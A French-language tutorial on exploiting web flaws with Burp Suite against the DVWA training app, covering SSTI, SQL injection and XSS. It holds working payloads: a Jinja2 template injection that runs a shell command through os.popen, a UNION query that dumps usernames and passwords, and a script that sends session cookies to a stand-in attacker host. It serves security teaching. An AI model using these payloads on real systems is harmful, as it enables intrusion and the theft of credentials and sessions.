# Burp Suite Web Vulnerabilities Guide

Guide pratique et méthodologique d'exploitation des vulnérabilités web à l'aide de Burp Suite et de l'environnement DVWA.

---

## Sommaire
1. [Environnement de Test : DVWA](#1-environnement-de-test--dvwa)
2. [Injection de Modèle Côté Serveur (SSTI)](#2-ssti---server-side-template-injection)
3. [Injection SQL (SQLi)](#3-sql-injection)
4. [Cross-Site Scripting (XSS)](#4-cross-site-scripting)

---

## 1. Environnement de Test : DVWA

### Configuration initiale
Avant de tester les vulnérabilités sur une application comme DVWA (Damn Vulnerable Web Application) :
1. **Paramétrage du niveau** : Se rendre dans l'onglet de configuration (DVWA Security) et ajuster le niveau de sécurité selon l'exercice (par exemple *Medium*), puis cliquer sur **Submit**.
2. **Phase de test** : Saisir une valeur basique dans le formulaire cible, cliquer sur **Submit**, puis intercepter le trafic.
3. **Analyse du code source** : Consulter systématiquement le code source fourni (bouton *View Source*) pour comprendre comment le serveur traite (ou filtre mal) les entrées utilisateur selon le niveau choisi.

---

## 2. SSTI - Server-Side Template Injection

### Principe
Le SSTI se produit lorsqu'une application intègre des données utilisateur non sanitisées directement dans un modèle de rendu (template engine comme Jinja2 sous Python), permettant d'exécuter du code arbitraire sur le serveur (RCE).

### Méthodologie & Manipulation (Burp Suite)
1. **Interception** : Capturer la requête HTTP via le proxy de Burp Suite.
2. **Transfert au Repeater** : Envoyer la requête dans l'onglet Repeater pour tester les charges utiles.
3. **Encodage (Crucial)** : Convertir les caractères spéciaux (`{`, `}`, espaces, guillemets) au format URL-encode (`%7B`, `%7D`, `%20`) pour que le moteur Jinja2 et le serveur les lisent et les interprètent correctement sans bloquer la requête.

### Charge Utile & Commandes
* Test de base : `{{7*7}}`
* Exécution de commande (RCE) pour lire un fichier (version brute) : 
  `email={{ config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read() }}`
* Version encodée prête pour le Repeater : 
  `email=%7B%7B%20config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20/flag.txt%27).read()%20%7D%7D`

---

## 3. SQL Injection (SQLi)

### Principe
L'injection SQL survient lorsqu'une application insère des entrées utilisateur non sécurisées directement dans une requête de base de données, permettant de contourner l'authentification ou de manipuler la structure de la requête.

### Méthodologie & Manipulation (Burp Suite)
1. **Interception** : Capturer la requête contenant le paramètre cible via le proxy de Burp Suite.
2. **Transfert au Repeater** : Envoyer la requête dans l'onglet Repeater pour analyser le comportement de la base de données.
3. **Exploitation** : Utiliser des tautologies (`OR 1 = 1`) ou l'opérateur `UNION` pour combiner les résultats de la requête originale avec une requête personnalisée.

### Charge Utile & Commandes
* Test de tautologie : `' OR 1 = 1 --`
* Extraction par UNION : `' UNION SELECT null, username, password FROM users --`
* **Correction** : Utiliser des requêtes paramétrées (instructions préparées) pour séparer strictement le code SQL des données.

---

## 4. Cross-Site Scripting (XSS)

### Principe
Le XSS permet d'injecter du code malveillant (généralement du JavaScript) dans des pages web consultées par d'autres utilisateurs, qu'il soit stocké durablement sur le serveur (Stored XSS) ou renvoyé immédiatement (Reflected XSS).

### Méthodologie & Manipulation (Burp Suite)
1. **Interception** : Capturer les points d'entrée (champs de saisie, paramètres d'URL) via le proxy de Burp Suite.
2. **Transfert au Repeater** : Envoyer la requête dans l'onglet Repeater pour tester la réflexion ou l'enregistrement du code.
3. **Injection** : Soumettre des charges de script pour vérifier si le navigateur de la victime les exécute.

### Charge Utile & Commandes
* Vecteur d'attaque classique : `<script>alert(1)</script>`
* Test de vol de session : `<script>fetch('http://attaquant.com/steal?cookie=' + document.cookie)</script>`
